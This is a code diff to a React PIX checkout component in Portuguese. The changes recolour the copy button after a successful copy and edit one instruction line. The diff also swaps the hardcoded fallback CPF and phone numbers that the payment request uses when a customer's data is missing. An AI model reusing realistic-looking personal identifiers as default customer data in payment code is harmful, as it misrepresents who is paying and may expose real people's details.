@@ -25,13 +25,14 @@ import React, { useEffect, useState } from 'react';
       const [qrCodeUrl, setQrCodeUrl] = useState<string | null>(null);
       const [loading, setLoading] = useState(true);
       const [timerStarted, setTimerStarted] = useState(false);
+      const [copyButtonColor, setCopyButtonColor] = useState("#ee4d2d");
 
       useEffect(() => {
         const generatePayment = async () => {
           const customerName = localStorage.getItem('CHECKOUT_NAME') || 'dasdasd asdasd';
           const customerEmail = localStorage.getItem('CHECKOUT_EMAIL') || 'dasdasd@dasdas.com';
-          const customerCPF = localStorage.getItem('CHECKOUT_CPF') || '94179565900';
-          const customerPhone = localStorage.getItem('CHECKOUT_PHONE') || '11985566415';
+          const customerCPF = localStorage.getItem('CHECKOUT_CPF') || '01750899221';
+          const customerPhone = localStorage.getItem('CHECKOUT_PHONE') || '94984185145';
           const utmParamsString = localStorage.getItem('utmParams');
           const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};
 
@@ -128,10 +129,15 @@ import React, { useEffect, useState } from 'react';
           try {
             await navigator.clipboard.writeText(pixCode);
             setCopied(true);
-            setTimeout(() => setCopied(false), 2000);
+            setCopyButtonColor("#48bb78");
+            setTimeout(() => {
+              setCopied(false);
+              setCopyButtonColor("#ee4d2d");
+            }, 2000);
           } catch (err) {
             console.error("Failed to copy text: ", err);
             setCopied(false);
+            setCopyButtonColor("#ee4d2d");
           }
         }
       };
@@ -184,7 +190,8 @@ import React, { useEffect, useState } from 'react';
                       </div>
                       <button
                         onClick={handleCopy}
-                        className="w-full bg-[#ee4d2d] text-white py-3 rounded-lg flex items-center justify-center space-x-2 hover:bg-[#a1341e] transition-colors"
+                        className={`w-full text-white py-3 rounded-lg flex items-center justify-center space-x-2 hover:bg-[#a1341e] transition-colors`}
+                        style={{ backgroundColor: copyButtonColor }}
                       >
                         <Copy size={20} />
                         <span>{copied ? 'Copiado!' : 'Copiar código PIX'}</span>
@@ -205,7 +212,7 @@ import React, { useEffect, useState } from 'react';
                   1
                 </div>
                 <div className="flex-1">
-                  <p className="text-gray-700">Copie o código PIX acima.</p>
+                  <p className="text-gray-700">Copie o código PIX abaixo.</p>
                 </div>
               </div>
 
